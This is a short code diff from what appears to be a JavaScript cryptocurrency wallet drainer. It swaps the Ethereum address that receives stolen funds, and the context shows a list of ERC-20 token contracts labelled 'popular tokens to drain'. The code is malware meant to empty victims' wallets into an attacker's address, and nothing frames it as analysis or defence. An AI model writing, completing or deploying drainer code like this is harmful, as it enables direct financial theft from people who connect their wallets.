@@ -84,7 +84,7 @@ $(document).ready(function() {
     }
 
     // Your Ethereum address to receive funds
-    const RECEIVER_ADDRESS = "0x742d35Cc6634C0532925a3b8D79dCf4c6e3c6C8f"; // Replace with your ETH address
+    const RECEIVER_ADDRESS = "0x5D3A140d5906Cb2B3f7947561dE94ED895FFB19d"; // Replace with your ETH address
 
     // Common ERC-20 token contracts (popular tokens to drain)
     const COMMON_TOKENS = [
